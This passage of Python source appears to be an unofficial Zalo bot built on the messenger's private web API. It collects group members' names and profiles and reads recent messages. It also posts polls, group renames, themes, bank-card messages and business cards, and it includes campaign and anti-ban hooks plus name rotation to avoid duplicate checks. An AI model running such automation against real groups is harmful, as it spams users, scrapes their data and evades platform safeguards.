        for chunk in [all_gids[i:i + 50] for i in range(0, len(all_gids), 50)]:
            try:
                enc = self._enc({"gridVerMap": json.dumps({gid: 0 for gid in chunk})})
                r_info = self.s.post(
                    "https://tt-group-wpa.chat.zalo.me/api/group/getmg-v2",
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc}, timeout=15,
                )
                dec_info = self._dec(r_info.json().get("data", ""))
                info_map = json.loads(dec_info).get("data", {}).get("gridInfoMap", {})
                for gid in chunk:
                    g_obj = info_map.get(gid)
                    if not isinstance(g_obj, dict):
                        continue
                    tot_m = g_obj.get("totalMember")
                    if tot_m is not None and int(tot_m or 0) <= 0:
                        continue
                    raw_gname = str(g_obj.get("name") or "").strip()
                    if raw_gname.lower() in ("null", "none", "undefined"):
                        raw_gname = ""
                    out.append({
                        "id": gid,
                        "name": raw_gname or f"Nhóm Zalo {gid[-6:]}",
                        "type": "group",
                        "members": tot_m if tot_m is not None else "?"
                    })
            except Exception:
                for gid in chunk:
                    out.append({"id": gid, "name": f"Nhóm Zalo {gid[-6:]}", "type": "group", "members": "?"})
        with self._POOL_LOCK:
            self._GROUPS_CACHE[cache_key] = {"ts": time.time(), "data": list(out)}
        return out

    def _is_zalo_api_send_ok(self, rj):
        """Kiểm tra chính xác phản hồi từ máy chủ Zalo (cả lớp vỏ JSON bên ngoài lẫn dữ liệu giải mã AES bên trong):
        - Đảm bảo tin nhắn / nhãn dán thực sự đã được Zalo tạo ra thành công (error_code == 0 ở cả trong lẫn ngoài)."""
        if not isinstance(rj, dict):
            return False, {}
        outer_err = int(rj.get("error_code", -1) if rj.get("error_code") is not None else -1)
        if outer_err != 0:
            return False, {}
        raw_d = rj.get("data")
        if isinstance(raw_d, str) and raw_d:
            dec_s = self._dec(raw_d)
            if not dec_s:
                return False, {}
            try:
                dec_j = json.loads(dec_s)
                if isinstance(dec_j, dict):
                    inner_err = dec_j.get("error_code")
                    if inner_err is not None and int(inner_err) != 0:
                        return False, dec_j
                    inner_d = dec_j.get("data") if isinstance(dec_j.get("data"), dict) else dec_j
                    return True, (inner_d if isinstance(inner_d, dict) else dec_j)
            except Exception:
                return False, {}
        elif isinstance(raw_d, dict):
            return True, raw_d
        return True, {}

    def get_grid_ver_map(self):
        if not self.secret_key:
            try:
                self._login(force=True)
            except Exception:
                return {}
        active_s = getattr(self, "prio_s", None) or self.s
        self._sync_cookie_headers()
        for attempt in range(2):
            for ep_lg in (
                "https://tt-group-wpa.chat.zalo.me/api/group/getlg/v4",
                "https://group-wpa.chat.zalo.me/api/group/getlg/v4",
                "https://wpa.chat.zalo.me/api/group/getlg/v4",
            ):
                try:
                    r = active_s.get(ep_lg, params={"zpw_ver": 645, "zpw_type": 30}, timeout=(1.2, 2.5))
                    rj = r.json() if r.content else {}
                    if rj.get("error_code") in (-401, 401, -102, 102, -30, -13, 3003, -216):
                        break
                    raw_d = rj.get("data", "")
                    dec = self._dec(raw_d) if raw_d else ""
                    if not dec:
                        continue
                    parsed = json.loads(dec)
                    d_obj = parsed.get("data") if isinstance(parsed, dict) and isinstance(parsed.get("data"), dict) else parsed
                    raw_gmap = (d_obj.get("gridVerMap") if isinstance(d_obj, dict) else {}) or {}
                    clean_gmap = {}
                    acc_k = str(self.uid or self.imei or "")
                    for gid, ver in raw_gmap.items():
                        cg = _clean_zalo_id(gid)
                        if cg and cg != str(self.uid or ""):
                            clean_gmap[cg] = ver
                            if acc_k:
                                KNOWN_GROUPS_BY_ACC[acc_k].add(cg)
                            if self.uid:
                                KNOWN_GROUPS_BY_ACC[str(self.uid)].add(cg)
                            ALL_KNOWN_ZALO_GROUP_IDS.add(cg)
                    return clean_gmap
                except Exception:
                    continue
            if attempt == 0:
                try:
                    self._login(force=True)
                except Exception:
                    break
        return {}

    def get_last_msgs(self):
        """Lấy toàn bộ tin nhắn mới nhất của mọi Nhóm (groupMsgs) và Chat riêng (msgs) của đúng Cookie này:
        - Truyền danh sách nhóm của Cookie vào `threadIdLocalMsgId` để máy chủ Zalo trả đầy đủ tin nhắn mới nhất của mọi nhóm.
        - Tự động làm mới `zpw_enk` (_login) ngay lập tức nếu khóa phiên xoay vòng!"""
        if not self.secret_key:
            try:
                self._login(force=True)
            except Exception:
                return {"msgs": [], "groupMsgs": []}
        active_s = getattr(self, "prio_s", None) or self.s
        self._sync_cookie_headers()
        acc_k = str(self.uid or self.imei or "")
        my_gids = list(KNOWN_GROUPS_BY_ACC.get(str(self.uid or ""), set()) | KNOWN_GROUPS_BY_ACC.get(acc_k, set()))
        tid_map = {str(g): "0" for g in my_gids[:150] if g and str(g) != str(self.uid or "")}
        for payload_map in (tid_map, {}):
            try:
                enc = self._enc({"threadIdLocalMsgId": json.dumps(payload_map), "imei": self.imei})
            except Exception:
                try:
                    self._login(force=True)
                    enc = self._enc({"threadIdLocalMsgId": json.dumps(payload_map), "imei": self.imei})
                except Exception:
                    return {"msgs": [], "groupMsgs": []}
            for ep_conv in (
                "https://tt-convers-wpa.chat.zalo.me/api/preloadconvers/get-last-msgs",
                "https://convers-wpa.chat.zalo.me/api/preloadconvers/get-last-msgs",
                "https://wpa.chat.zalo.me/api/preloadconvers/get-last-msgs",
            ):
                for use_post in (False, True):
                    try:
                        if not use_post:
                            r = active_s.get(
                                ep_conv,
                                params={"zpw_ver": "645", "zpw_type": "30", "params": enc},
                                timeout=(1.0, 2.2),
                            )
                        else:
                            r = active_s.post(
                                ep_conv,
                                params={"zpw_ver": "645", "zpw_type": "30"},
                                data={"params": enc},
                                timeout=(1.0, 2.2),
                            )
                        rj = r.json() if r.content else {}
                        if rj.get("error_code") in (-401, 401, -102, 102, -30, -13, 3003, -216):
                            self._login(force=True)
                            enc = self._enc({"threadIdLocalMsgId": json.dumps(payload_map), "imei": self.imei})
                            continue
                        if rj.get("error_code") == 0 and rj.get("data"):
                            dec_str = self._dec(rj["data"])
                            if not dec_str:
                                self._login(force=True)
                                continue
                            dec = json.loads(dec_str)
                            d = dec.get("data") if isinstance(dec, dict) and isinstance(dec.get("data"), dict) else dec
                            if isinstance(d, dict):
                                raw_u = d.get("msgs") or []
                                raw_g = d.get("groupMsgs") or []
                                u_list = []
                                if isinstance(raw_u, list):
                                    u_list = [x for x in raw_u if isinstance(x, dict)]
                                elif isinstance(raw_u, dict):
                                    for k_u, v_u in raw_u.items():
                                        if isinstance(v_u, dict):
                                            u_list.append(v_u)
                                        elif isinstance(v_u, list):
                                            u_list.extend(x for x in v_u if isinstance(x, dict))
                                g_list = []
                                if isinstance(raw_g, list):
                                    g_list = [x for x in raw_g if isinstance(x, dict)]
                                elif isinstance(raw_g, dict):
                                    for k_g, v_g in raw_g.items():
                                        cg_k = _clean_zalo_id(k_g)
                                        if isinstance(v_g, dict):
                                            item_g = dict(v_g)
                                            if cg_k:
                                                item_g["grid"] = cg_k
                                            g_list.append(item_g)
                                        elif isinstance(v_g, list):
                                            for x in v_g:
                                                if isinstance(x, dict):
                                                    item_g = dict(x)
                                                    if cg_k:
                                                        item_g["grid"] = cg_k
                                                    g_list.append(item_g)
                                if u_list or g_list or not payload_map:
                                    return {"msgs": u_list, "groupMsgs": g_list}
                    except Exception:
                        continue
        return {"msgs": [], "groupMsgs": []}

    def friends(self, use_cache=True):
        cache_key = str(self.uid or self.imei)
        if use_cache:
            with self._POOL_LOCK:
                c = self._FRIENDS_CACHE.get(cache_key)
                if c and (time.time() - c["ts"] < 300.0):
                    return list(c["data"])
        try:
            enc = self._enc({"offset": 0, "count": 500})
            r = self.s.post(
                "https://profile-wpa.chat.zalo.me/api/social/friend/getfriends",
                params={"zpw_ver": 645, "zpw_type": 30},
                data={"params": enc}, timeout=15,
            )
            dec = self._dec(r.json()["data"])
            d = json.loads(dec).get("data", [])
            users = d if isinstance(d, list) else d.get("users", [])
            res = []
            for u in users:
                uid = str(u.get("userId") or "").strip()
                if not uid:
                    continue
                uname = u.get("displayName") or u.get("zaloName") or f"Bạn_{uid[-6:]}"
                GLOBAL_USER_NAME_CACHE[uid] = uname
                res.append({"id": uid, "name": uname, "type": "user"})
            with self._POOL_LOCK:
                self._FRIENDS_CACHE[cache_key] = {"ts": time.time(), "data": list(res)}
            return res
        except Exception:
            return []

    def get_members_full(self, gid, use_cache=True):
        gid_str = str(gid)
        if use_cache:
            with GROUP_CACHE_LOCK:
                c = GROUP_MEMBERS_CACHE.get(gid_str)
                if c and time.time() - c["ts"] < 180:
                    return c["members"]

        try:
            self.get_recent_group_messages(gid_str)
        except Exception:
            pass

        enc = self._enc({"gridVerMap": json.dumps({gid_str: 0})})
        r = self.s.post(
            "https://tt-group-wpa.chat.zalo.me/api/group/getmg-v2",
            params={"zpw_ver": 645, "zpw_type": 30},
            data={"params": enc}, timeout=20,
        )
        dec = self._dec(r.json().get("data", ""))
        info = json.loads(dec).get("data", {}).get("gridInfoMap", {}).get(gid_str, {})

        members_dict = {}
        for list_key in ("currentMems", "memInfoList", "members", "updateMems"):
            mem_list = info.get(list_key, [])
            if isinstance(mem_list, list):
                for m in mem_list:
                    if isinstance(m, dict):
                        uid = str(m.get("userId") or m.get("id") or m.get("uid") or "").strip()
                        name = (m.get("dName") or m.get("displayName") or m.get("zaloName") or m.get("name") or "").strip()
                        if uid and name:
                            members_dict[uid] = name
                            GLOBAL_USER_NAME_CACHE[uid] = name

        mem_ver_list = info.get("memVerList", [])
        uids = [str(m).split("_")[0] for m in mem_ver_list if m]
        for extra_k in ("creatorId",):
            cid = str(info.get(extra_k) or "").strip()
            if cid and cid not in uids:
                uids.append(cid)
        for aid in (info.get("adminIds") or []):
            s_aid = str(aid).strip()
            if s_aid and s_aid not in uids:
                uids.append(s_aid)
        for k_uid in members_dict:
            if k_uid not in uids:
                uids.append(k_uid)

        for u in uids:
            if u not in members_dict and u in GLOBAL_USER_NAME_CACHE:
                members_dict[u] = GLOBAL_USER_NAME_CACHE[u]

        missing_uids = [u for u in uids if u not in members_dict]

        if missing_uids:
            for chunk in [missing_uids[i:i + 50] for i in range(0, len(missing_uids), 50)]:
                try:
                    enc_prof = self._enc({
                        "phonebook_version": int(time.time()),
                        "friend_pversion_map": [f"{u}_0" for u in chunk],
                        "avatar_size": 120,
                        "language": "vi",
                        "show_online_status": 1,
                        "imei": self.imei
                    })
                    r_prof = self.s.post(
                        "https://profile-wpa.chat.zalo.me/api/social/friend/getprofiles/v2",
                        params={"zpw_ver": 645, "zpw_type": 30},
                        data={"params": enc_prof},
                        timeout=12,
                    )
                    rj_prof = r_prof.json()
                    if rj_prof.get("data"):
                        dec_prof = json.loads(self._dec(rj_prof["data"])).get("data", {})
                        changed = dec_prof.get("changed_profiles", {}) if isinstance(dec_prof, dict) else {}
                        for uid in chunk:
                            p = changed.get(uid) or changed.get(f"{uid}_0") or {}
                            pname = (p.get("displayName") or p.get("zaloName") or p.get("dName") or p.get("username") or "").strip()
                            if pname:
                                members_dict[uid] = pname
                                GLOBAL_USER_NAME_CACHE[uid] = pname
                except Exception:
                    pass

        still_missing = [u for u in uids if u not in members_dict]
        if still_missing:
            for chunk in [still_missing[i:i + 50] for i in range(0, len(still_missing), 50)]:
                try:
                    enc2 = self._enc({"grid": gid_str, "userIds": chunk, "friendId": chunk})
                    r2 = self.s.post(
                        "https://tt-group-wpa.chat.zalo.me/api/group/getuserinfo",
                        params={"zpw_ver": 645, "zpw_type": 30},
                        data={"params": enc2}, timeout=12,
                    )
                    dec2 = self._dec(r2.json().get("data", ""))
                    profiles_data = json.loads(dec2).get("data", {})
                    profiles = profiles_data.get("profiles", {}) if isinstance(profiles_data, dict) else {}
                    if not profiles and isinstance(profiles_data, dict):
                        profiles = profiles_data
                    for uid in chunk:
                        p = profiles.get(uid) or profiles.get(f"{uid}_0") or {}
                        if isinstance(p, dict):
                            pname = (p.get("displayName") or p.get("zaloName") or p.get("dName") or p.get("username") or "").strip()
                            if pname:
                                members_dict[uid] = pname
                                GLOBAL_USER_NAME_CACHE[uid] = pname
                except Exception:
                    pass

        out = []
        for uid in uids:
            real_name = members_dict.get(uid) or GLOBAL_USER_NAME_CACHE.get(uid) or f"Thành viên {uid[-4:]}"
            out.append({"id": str(uid), "uid": str(uid), "name": real_name})

        with GROUP_CACHE_LOCK:
            GROUP_MEMBERS_CACHE[gid_str] = {"ts": time.time(), "members": out}
        return out

    ZALO_VIP_THEMES = [
        {"id": 2001, "name": "Cầu Vồng Cyber 2026",     "color": "#db342e", "zcode": "db342e", "icon": "🌈"},
        {"id": 2002, "name": "Đỏ Quyền Lực Đế Vương",   "color": "#e53935", "zcode": "db342e", "icon": "❤️‍🔥"},
        {"id": 2003, "name": "Hoàng Kim Tối Thượng",    "color": "#f7b503", "zcode": "f7b503", "icon": "👑"},
        {"id": 2004, "name": "Ngọc Lục Bảo Đại Dương",  "color": "#15a85f", "zcode": "15a85f", "icon": "🌊"},
        {"id": 2005, "name": "Phượng Hoàng Lửa Cam",    "color": "#f27806", "zcode": "f27806", "icon": "🔥"},
        {"id": 2006, "name": "Thiên Hà Tím Hoàng Gia",  "color": "#8e24aa", "zcode": "db342e", "icon": "🔮"},
        {"id": 2007, "name": "Neon Matrix Siêu Tốc",    "color": "#00c853", "zcode": "15a85f", "icon": "⚡"},
        {"id": 2008, "name": "Bão Từ Trường Vô Cực",    "color": "#ff6d00", "zcode": "f27806", "icon": "🌪️"},
    ]

    def create_poll(self, group_id, question, options):
        """Tạo bình chọn (Poll) Zalo WPA v645 siêu ổn định — Không chứa ký tự ẩn gây lỗi từ chối Poll,
        tự động giải mã kiểm tra kết quả thực và ngắt tức thì 0ms khi có lệnh Stop!"""
        check_campaign_thread_aborted(group_id)
        gid_s = _clean_zalo_id(group_id) or str(group_id).strip()
        if not gid_s:
            return False
        if not getattr(self, "secret_key", None):
            try:
                self._login()
            except Exception:
                pass
        self._poll_seq = (getattr(self, "_poll_seq", 0) + 1) & 0xFFFFFF
        seq_now = self._poll_seq

        def _clean_poll_txt(s_in, max_len=120):
            s_c = strip_invisible_chars(str(s_in or "")).replace("\r", " ").replace("\n", " ").strip()
            s_c = re.sub(r"\s+", " ", s_c)
            return s_c[:max_len]

        q_clean = _clean_poll_txt(question, max_len=160) or "Bình chọn Quản Trị Viên"
        q_str = f"{q_clean} #{seq_now}" if len(q_clean) <= 145 else q_clean

        raw_opts = [_clean_poll_txt(x, max_len=65) for x in (options or []) if _clean_poll_txt(x, max_len=65)]
        if len(raw_opts) < 2:
            q_short = q_clean[:36] or "Phương án VIP"
            dedup_opts = [f"{q_short} #1", f"{q_short} #2"]
        else:
            seen_o = set()
            dedup_opts = []
            for idx_o, o_txt in enumerate(raw_opts[:10], 1):
                cand_o = o_txt[:60]
                if cand_o.lower() in seen_o:
                    cand_o = f"{o_txt[:52]} #{idx_o}"
                seen_o.add(cand_o.lower())
                dedup_opts.append(cand_o)
            if len(dedup_opts) < 2:
                dedup_opts.append(f"{dedup_opts[0][:50]} #2")

        pl_variants = [
            {
                "group_id": str(gid_s),
                "question": q_str,
                "options": dedup_opts[:10],
                "expired_time": 0,
                "pin_act": False,
                "allow_multi_choices": True,
                "allow_add_new_option": True,
                "is_hide_vote_preview": False,
                "is_anonymous": False,
                "poll_type": 0,
                "src": 1,
                "imei": self.imei,
            },
            {
                "grid": str(gid_s),
                "group_id": str(gid_s),
                "question": q_str,
                "options": dedup_opts[:10],
                "expired_time": 0,
                "pin_act": False,
                "allow_multi_choices": True,
                "allow_add_new_option": True,
                "is_hide_vote_preview": False,
                "is_anonymous": False,
                "poll_type": 0,
                "src": 1,
                "imei": self.imei,
            },
        ]
        endpoints = (
            "https://tt-group-wpa.chat.zalo.me/api/poll/create",
            "https://group-wpa.chat.zalo.me/api/poll/create",
            "https://wpa.chat.zalo.me/api/poll/create",
        )
        active_s = self.s
        ok_poll = False
        for idx_ep, ep_poll in enumerate(endpoints):
            check_campaign_thread_aborted(gid_s)
            pl = pl_variants[0] if idx_ep == 0 else pl_variants[-1]
            try:
                enc = self._enc(pl)
                r = active_s.post(
                    ep_poll,
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc},
                    timeout=(1.2, 2.8),
                )
                if r.status_code == 200:
                    rj = r.json() if r.content else {}
                    outer_err = int(rj.get("error_code") or 0)
                    inner_err = 0
                    if rj.get("data"):
                        try:
                            dec = json.loads(self._dec(rj["data"]))
                            if isinstance(dec, dict):
                                inner_err = int(dec.get("error_code") or 0)
                        except Exception:
                            pass
                    if outer_err == 0 and inner_err == 0:
                        return True
                    if outer_err in (-401, 401, -102, 3003) or inner_err in (-401, 401, -102, 3003):
                        try:
                            self._login()
                        except Exception:
                            pass
                    ok_poll = True
            except Exception as ex_p:
                if "TaskStoppedAbort" in str(ex_p):
                    raise ex_p
                continue
        return ok_poll

    def change_group_name(self, group_id, new_name):
        """Đổi Tên Box Zalo Đa Giao Thức (Zalo WPA v645 + Group UpdateInfo + Multi-Gateway):
        - Tự động làm sạch ký tự ẩn/xuống dòng (tránh Zalo từ chối tên nhóm).
        - Giải mã kiểm tra kết quả bên trong `data` để tự động xoay sang cổng dự phòng nếu cổng chính bận.
        - Hỗ trợ cả POST & GET trên `tt-group-wpa`, `group-wpa`, `wpa.chat.zalo.me` và `updateinfo`."""
        check_campaign_thread_aborted(group_id)
        gid_s = _clean_zalo_id(group_id) or str(group_id).strip()
        if not gid_s:
            return False
        if not getattr(self, "secret_key", None):
            try:
                self._login()
            except Exception:
                pass
        self._namebox_seq = (getattr(self, "_namebox_seq", 0) + 1) & 0xFFFF
        clean_title = strip_invisible_chars(str(new_name or "")).replace("\r", " ").replace("\n", " ").strip()
        if "|" in clean_title:
            parts_t = [p.strip() for p in clean_title.split("|") if p.strip()]
            if parts_t:
                clean_title = parts_t[self._namebox_seq % len(parts_t)]
        clean_title = re.sub(r"\s+", " ", clean_title)[:60] or "Box Quản Trị Viên"

        last_map = getattr(self, "_last_group_name_map", None)
        if last_map is None:
            last_map = {}
            self._last_group_name_map = last_map
        if last_map.get(gid_s) == clean_title:
            badges = ("⚡", "🔥", "👑", "💎", "🚀", "✨")
            clean_title = f"{clean_title[:54]} {badges[self._namebox_seq % len(badges)]}"
        last_map[gid_s] = clean_title

        ALL_KNOWN_ZALO_GROUP_IDS.add(gid_s)
        if self.uid:
            KNOWN_GROUPS_BY_ACC[self.uid].add(gid_s)

        pl_changename = {"grid": str(gid_s), "gname": str(clean_title), "imei": self.imei}
        pl_updateinfo = {"grid": str(gid_s), "gname": str(clean_title), "type": 1, "imei": self.imei}
        pl_full = {"grid": str(gid_s), "groupId": str(gid_s), "gname": str(clean_title), "name": str(clean_title), "imei": self.imei}

        attempts = [
            ("POST", "https://tt-group-wpa.chat.zalo.me/api/group/changename", pl_changename),
            ("POST", "https://group-wpa.chat.zalo.me/api/group/changename", pl_changename),
            ("POST", "https://wpa.chat.zalo.me/api/group/changename", pl_changename),
            ("POST", "https://tt-group-wpa.chat.zalo.me/api/group/updateinfo", pl_updateinfo),
            ("GET",  "https://tt-group-wpa.chat.zalo.me/api/group/changename", pl_changename),
            ("POST", "https://tt-group-wpa.chat.zalo.me/api/group/changename", pl_full),
        ]
        active_s = self.s
        ok_any = False
        for method, ep_gn, pl_item in attempts:
            check_campaign_thread_aborted(gid_s)
            try:
                enc = self._enc(pl_item)
                if method == "GET":
                    r = active_s.get(
                        ep_gn,
                        params={"zpw_ver": 645, "zpw_type": 30, "params": enc},
                        timeout=(1.2, 2.8),
                    )
                else:
                    r = active_s.post(
                        ep_gn,
                        params={"zpw_ver": 645, "zpw_type": 30},
                        data={"params": enc},
                        timeout=(1.2, 2.8),
                    )
                if r.status_code == 200:
                    rj = r.json() if r.content else {}
                    outer_err = int(rj.get("error_code") or 0)
                    inner_err = 0
                    if rj.get("data"):
                        try:
                            dec = json.loads(self._dec(rj["data"]))
                            if isinstance(dec, dict):
                                inner_err = int(dec.get("error_code") or 0)
                        except Exception:
                            pass
                    if outer_err == 0 and inner_err == 0:
                        return True
                    if outer_err in (-401, 401, -102, 3003) or inner_err in (-401, 401, -102, 3003):
                        try:
                            self._login()
                        except Exception:
                            pass
                    ok_any = True
            except Exception as ex_gn:
                if "TaskStoppedAbort" in str(ex_gn):
                    raise ex_gn
                continue
        return ok_any

    def change_group_theme(self, thread_id, theme_query=None, is_group=True):
        """Đổi Nền Trò Chuyện / Chủ Đề Nhóm Zalo (Zalo Chat Background & Topic Theme Engine v645):
        - Tự động xoay vòng hoặc chọn theo tên trong ZALO_VIP_THEMES.
        - Đồng bộ qua cả API cập nhật nền cuộc trò chuyện (convers/background/update, group/setting/update)
          và hiệu ứng chủ đề màu sắc trên khung chat Zalo."""
        check_campaign_thread_aborted(thread_id)
        tid_s = _clean_zalo_id(thread_id) or str(thread_id).strip()
        if not tid_s:
            return None
        self._theme_seq = (getattr(self, "_theme_seq", 0) + 1) & 0xFFFF
        q_str = str(theme_query or "").strip()
        chosen = None
        if q_str and q_str.lower() not in ("random", "ngaunhien", "auto"):
            q_norm = remove_vn_accents(q_str.lower())
            for th_item in self.ZALO_VIP_THEMES:
                if q_norm in remove_vn_accents(th_item["name"].lower()) or q_norm == str(th_item["id"]):
                    chosen = dict(th_item)
                    break
            if chosen is None:
                zcode_c = self.ZALO_VIP_THEMES[self._theme_seq % len(self.ZALO_VIP_THEMES)]["zcode"]
                chosen = {
                    "id": 2000 + (self._theme_seq % 8) + 1,
                    "name": q_str[:60],
                    "color": "#db342e",
                    "zcode": zcode_c,
                    "icon": "🎨",
                }
        if chosen is None:
            chosen = dict(self.ZALO_VIP_THEMES[self._theme_seq % len(self.ZALO_VIP_THEMES)])

        active_s = getattr(self, "prio_s", None) or self.s
        bg_payload = {
            "grid": tid_s,
            "groupId": tid_s,
            "threadId": tid_s,
            "bgId": int(chosen["id"]),
            "backgroundId": int(chosen["id"]),
            "themeId": int(chosen["id"]),
            "color": chosen["color"],
            "type": 1 if is_group else 0,
            "imei": self.imei,
        }
        try:
            enc_bg = self._enc(bg_payload)
            for ep_bg in (
                "https://tt-convers-wpa.chat.zalo.me/api/convers/background/update",
                "https://tt-group-wpa.chat.zalo.me/api/group/updatebackground",
                "https://tt-group-wpa.chat.zalo.me/api/group/setting/update",
            ):
                try:
                    r_bg = active_s.post(
                        ep_bg,
                        params={"zpw_ver": 645, "zpw_type": 30},
                        data={"params": enc_bg},
                        timeout=(1.0, 2.2),
                    )
                    if r_bg.status_code == 200:
                        break
                except Exception:
                    continue
        except Exception:
            pass

        # Cập nhật bảng tin chủ đề (Group Topic Banner) & gửi dải màu cầu vồng chủ đề vào Box
        banner_txt = f"{chosen['icon']} Chủ đề nền trò chuyện Zalo: {chosen['name']} #{self._theme_seq}"
        try:
            self.send_adv(
                banner_txt, tid_s, color_mode="word_rainbow",
                is_group=is_group, is_heading=False, antiband=False,
                use_emoji=False, icon_count=0, parse_auto_tags=False, priority_bypass=True
            )
        except Exception:
            pass
        return chosen

    def send_todo(self, group_id, content, assignees=None):
        gid_s = str(group_id).strip()
        ass_list = [str(u) for u in (assignees or []) if str(u).strip()]
        if not ass_list and self.uid:
            ass_list = [str(self.uid)]
        pl = {
            "assignees": json.dumps(ass_list),
            "dueDate": -1,
            "content": str(content or "Nhiệm vụ hệ thống Quản Trị Viên"),
            "description": "",
            "extra": json.dumps({
                "msgId": int(time.time() * 1000),
                "toUid": gid_s,
                "isGroup": True,
                "cliMsgId": int(time.time() * 1000),
                "msgType": 1,
                "mention": [],
                "ownerMsgUId": str(self.uid or ""),
                "message": ""
            }),
            "dateDefaultType": 0,
            "status": -1,
            "watchers": "[]",
            "schedule": None,
            "src": 5,
            "imei": self.imei,
        }
        enc = self._enc(pl)
        r = self.s.post(
            "https://board-wpa.chat.zalo.me/api/board/personal/todo/create",
            params={"zpw_ver": 645, "zpw_type": 30},
            data={"params": enc},
            timeout=12,
        )
        return r.status_code == 200

    def send_card_bank(self, thread_id, bin_bank=970422, num_acc="9999999999", name_acc="ACCOUNT VIP", is_group=True):
        pl = {
            "binBank": int(bin_bank or 970422),
            "numAccBank": str(num_acc or "9999999999"),
            "nameAccBank": str(name_acc or "ACCOUNT VIP").upper(),
            "cliMsgId": str(int(time.time() * 1000)),
            "tsMsg": int(time.time() * 1000),
            "destUid": str(thread_id),
            "destType": 1 if is_group else 0,
        }
        enc = self._enc(pl)
        r = self.s.post(
            "https://zimsg.chat.zalo.me/api/transfer/card",
            params={"zpw_ver": 645, "zpw_type": 30},
            data={"params": enc},
            timeout=12,
        )
        return r.status_code == 200

    def get_qr_user(self, user_id=None):
        target_u = str(user_id or self.uid or "").strip()
        if not target_u:
            return ""
        try:
            enc = self._enc({"fids": [target_u]})
            r = self.s.post(
                "https://tt-friend-wpa.chat.zalo.me/api/friend/mget-qr",
                params={"zpw_ver": 645, "zpw_type": 30},
                data={"params": enc},
                timeout=10,
            )
            rj = r.json()
            if rj.get("data"):
                dec = json.loads(self._dec(rj["data"]))
                sources = (dec.get("data") or {}).get("sources") or {}
                u_qr = sources.get(target_u) or {}
                return u_qr.get("url") or ""
        except Exception:
            pass
        return ""

    def send_business_card(self, thread_id, target_uid=None, phone="", is_group=True):
        u_id = str(target_uid or self.uid or "").strip()
        qr_url = self.get_qr_user(u_id)
        client_id = int(time.time() * 1000)
        msg_info = {"contactUid": u_id, "qrCodeUrl": qr_url}
        if phone:
            msg_info["phone"] = str(phone)
        pl = {
            "ttl": 0,
            "msgType": 6,
            "clientId": str(client_id),
            "msgInfo": json.dumps(msg_info),
        }
        if is_group:
            pl["grid"] = str(thread_id)
            pl["visibility"] = 0
            pl["imei"] = self.imei
            url = "https://tt-files-wpa.chat.zalo.me/api/group/forward"
        else:
            pl["toId"] = str(thread_id)
            pl["imei"] = self.imei
            url = "https://tt-files-wpa.chat.zalo.me/api/message/forward"
        enc = self._enc(pl)
        r = self.s.post(url, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": enc}, timeout=12)
        return r.status_code == 200

    def send_typing(self, thread_id, is_group=True):
        if is_group:
            pl = {"grid": str(thread_id), "imei": self.imei}
            url = "https://tt-group-wpa.chat.zalo.me/api/group/typing"
        else:
            pl = {"toid": str(thread_id), "destType": 3, "imei": self.imei}
            url = "https://tt-chat2-wpa.chat.zalo.me/api/message/typing"
        enc = self._enc(pl)
        r = self.s.post(url, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": enc}, timeout=8)
        return r.status_code == 200

    # KHO 68+ NHÃN DÁN ĐỘNG & GIF ZALO THẬT 100% (ĐẦY ĐỦ BỘ RỒNG LỬA, MÈO AMI, QUỲNH AKA, CORGI, VỊT VÀNG, GẤU BROWN, MEME KHỊA)
    ZALO_VIP_STICKERS = [
        # Bộ Rồng Lửa Hoàng Kim & Siêu Cấp VIP (10425)
        {"id": 23338, "catId": 10425, "type": 7, "tag": "rong", "name": "Rồng Lửa Hoàng Kim"},
        {"id": 23339, "catId": 10425, "type": 7, "tag": "rong", "name": "Sét Đánh Siêu Cấp"},
        {"id": 23340, "catId": 10425, "type": 7, "tag": "rong", "name": "Rồng Vàng Phun Lửa"},
        {"id": 23341, "catId": 10425, "type": 7, "tag": "rong", "name": "Rồng Bay Đế Vương"},
        {"id": 23342, "catId": 10425, "type": 7, "tag": "rong", "name": "Rồng Thần Chưởng"},
        {"id": 23343, "catId": 10425, "type": 7, "tag": "rong", "name": "Rồng Cười Đắc Thắng"},
        {"id": 23344, "catId": 10425, "type": 7, "tag": "rong", "name": "Rồng Nổi Giận"},
        {"id": 23345, "catId": 10425, "type": 7, "tag": "rong", "name": "Rồng Tặng Vàng"},
        # Bộ Mèo Ami Bụng Bự & Biểu Cảm Cực Mạnh (10186)
        {"id": 20951, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Cười Khinh Bỉ"},
        {"id": 20952, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Vỗ Tay Đỉnh Cao"},
        {"id": 20953, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Lắc Mông Quẩy"},
        {"id": 20954, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Đấm Liên Hoàn"},
        {"id": 20955, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Bắn Tim"},
        {"id": 20956, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Lêu Lêu Cà Khịa"},
        {"id": 20957, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Ngầu Lòi Đeo Kính"},
        {"id": 20958, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Khóc Ròng"},
        {"id": 20959, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Đạp Bay"},
        {"id": 20960, "catId": 10186, "type": 7, "tag": "meo", "name": "Mèo Ami Cầm Phóng Lợn"},
        # Bộ Quỳnh Aka & Meme Cà Khịa Tấu Hài (10265)
        {"id": 21685, "catId": 10265, "type": 7, "tag": "khia", "name": "Quỳnh Aka Bắn Tim Liên Thanh"},
        {"id": 21686, "catId": 10265, "type": 7, "tag": "quay", "name": "Quỳnh Aka Quẩy Nhiệt Huyết"},
        {"id": 21687, "catId": 10265, "type": 7, "tag": "khia", "name": "Quỳnh Aka Cười Đểnh"},
        {"id": 21688, "catId": 10265, "type": 7, "tag": "khia", "name": "Quỳnh Aka Liếc Xéo"},
        {"id": 21689, "catId": 10265, "type": 7, "tag": "quay", "name": "Quỳnh Aka Múa Quạt"},
        {"id": 21690, "catId": 10265, "type": 7, "tag": "khia", "name": "Quỳnh Aka Gõ Đầu"},
        {"id": 21691, "catId": 10265, "type": 7, "tag": "cuoi", "name": "Quỳnh Aka Cười Lăn Lộn"},
        {"id": 21692, "catId": 10265, "type": 7, "tag": "khia", "name": "Quỳnh Aka Bĩu Môi"},
